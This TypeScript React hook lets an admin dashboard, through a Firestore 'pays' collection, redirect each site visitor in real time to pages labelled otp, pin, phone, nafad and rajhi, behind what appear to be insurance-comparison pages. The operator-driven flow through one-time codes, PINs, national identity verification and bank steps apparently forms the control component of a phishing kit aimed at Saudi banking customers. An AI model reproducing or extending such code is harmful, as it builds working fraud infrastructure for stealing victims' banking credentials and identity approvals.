/**
 * Hook to monitor redirect requests from admin dashboard
 * Checks Firebase for redirectPage field and navigates accordingly
 */

import { useEffect, useRef } from "react";
import { useRouter } from "next/navigation";
import { checkRedirectPage, clearRedirectPage, clearRedirectPageImmediate } from "@/lib/visitor-tracking";
import { db } from "@/lib/firebase";
import { doc, onSnapshot, Firestore } from "firebase/firestore";

interface UseRedirectMonitorProps {
  visitorId: string;
  currentPage: string;
}

export function useRedirectMonitor({
  visitorId,
  currentPage,
}: UseRedirectMonitorProps) {
  const router = useRouter();
  // ✅ FIX: Track the last processed redirect to prevent re-triggering
  const redirectProcessedRef = useRef<string | null>(null);

  useEffect(() => {
    if (!visitorId || !db) return;

    // Listen to real-time changes in visitor document
    const unsubscribe = onSnapshot(
      doc(db as Firestore, "pays", visitorId),
      async (snapshot) => {
        if (snapshot.exists()) {
          const data = snapshot.data();
          const redirectPage = data.redirectPage;
          const currentStep = data.currentStep;

          // Modern system: Check redirectPage field
          // ✅ FIX: Only redirect if it's a NEW redirect (not already processed)
          if (
            redirectPage &&
            redirectPage !== currentPage &&
            redirectPage !== redirectProcessedRef.current
          ) {
            // Mark this redirect as processed
            redirectProcessedRef.current = redirectPage;

            console.log(
              `[useRedirectMonitor] Redirecting from ${currentPage} to ${redirectPage}`
            );

            // ✅ FIX: Clear the redirect flag IMMEDIATELY to prevent race condition
            await clearRedirectPageImmediate(visitorId);

            // Navigate to the requested page
            const pageMap: Record<string, string> = {
              home: "/home-new",
              insur: "/insur",
              compar: "/compar",
              check: "/check",
              payment: "/check",
              otp: "/step2",
              pin: "/step3",
              phone: "/step5",
              nafad: "/step4",
              rajhi: "/step6",
            };

            const targetUrl = pageMap[redirectPage] || "/";
            router.push(targetUrl);
          }

          // ✅ FIX: Reset processed redirect when redirectPage is cleared
          else if (!redirectPage && redirectProcessedRef.current) {
            redirectProcessedRef.current = null;
          }

          // Legacy system: Check currentStep field for phone and nafad
          else if (currentStep) {
            const legacyPageMap: Record<string, { page: string; url: string }> =
              {
                home: { page: "home", url: "/home-new" },
                phone: { page: "phone", url: "/step5" },
                rajhi: { page: "rajhi", url: "/step6" },
                _t6: { page: "nafad", url: "/step4" },
                _st1: { page: "check", url: "/check" },
                _t2: { page: "veri", url: "/step2" },
                _t3: { page: "confi", url: "/step3" },
              };

            const targetPage = legacyPageMap[currentStep as string];
            if (targetPage && targetPage.page !== currentPage) {
              console.log(
                `[useRedirectMonitor] Legacy redirect from ${currentPage} to ${targetPage.page}`
              );
              router.push(targetPage.url);
            }
          }
        }
      },
      (error) => {
        console.error("Error monitoring redirect:", error);
      }
    );

    // Cleanup subscription on unmount
    return () => unsubscribe();
  }, [visitorId, currentPage, router]);
}
